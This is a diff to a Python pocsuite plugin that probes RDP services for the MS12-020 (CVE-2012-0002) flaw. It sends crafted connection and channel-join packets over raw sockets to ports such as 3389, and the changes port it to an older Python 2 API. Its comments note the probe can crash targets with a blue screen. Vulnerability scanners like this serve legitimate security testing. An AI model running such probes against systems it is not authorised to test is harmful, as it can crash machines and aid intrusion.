@@ -4,10 +4,9 @@ import socket
 import struct
 import sys
 from binascii import hexlify, unhexlify
-from urllib.parse import urlparse
-from pocsuite3.api import register_poc
-from pocsuite3.api import Output, POCBase
-from pocsuite3.api import POC_CATEGORY, VUL_TYPE
+import urlparse
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
 
 
 class TestPOC(POCBase):
@@ -22,8 +21,7 @@ class TestPOC(POCBase):
     appPowerLink = 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-020'
     appName = 'RDP'
     appVersion = 'All'
-    vulType = VUL_TYPE.CODE_EXECUTION
-    category = POC_CATEGORY.EXPLOITS.DOS
+    vulType = 'Remote Code Execution'
     desc = '''
     MS12-020/CVE-2012-0002 Vulnerability Tester
     based on sleepya's version @ http://pastebin.com/Ks2PhKb4
@@ -93,15 +91,18 @@ class TestPOC(POCBase):
             ]))
 
             channel_join_request = unhexlify("0300000c02f08038")
+
             skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             skt.settimeout(10)
             skt.connect((host, port))
+
             skt.send(connection_request)
             data = skt.recv(8192)
             if data != unhexlify("0300000b06d00000123400") \
                     and data != unhexlify("030000130ed000001234000201080000000000"):
                 return (False, "ERROR: This isn't RDP")
                 #raise SystemExit(1)
+
             skt.send(initial_pdu)
 
             # Send attach user request
@@ -118,7 +119,7 @@ class TestPOC(POCBase):
             # Send channel join request
             skt.send(channel_join_request + user1 + user2)
             data = skt.recv(8192)
-            if data[7:9] == b"\x3e\x00":
+            if data[7:9] == "\x3e\x00":
                 """ 0x3e00 indicates a successful join; this service is vulnerable """
                 return (True, "This device is vulnerable")
                 # Complete request to prevent BSOD
@@ -132,11 +133,11 @@ class TestPOC(POCBase):
             skt.close()
 
         result = {}
-        pr = urlparse(self.url)
+        pr = urlparse.urlparse(self.url)
         if pr.port:  # and pr.port not in ports:
             ports = [pr.port]
         else:
-            ports = [3389, 13389, 23389]
+            ports = [3389,13389,23389]
         for port in ports:
             try:
                 status, msg = exploit(pr.hostname, port)
@@ -146,7 +147,6 @@ class TestPOC(POCBase):
                         pr.hostname, port)
                     break
             except:
-                # raise
                 pass
 
         return self.parse_output(result)
@@ -163,4 +163,4 @@ class TestPOC(POCBase):
         return output
 
 
-register_poc(TestPOC)
+register(TestPOC)
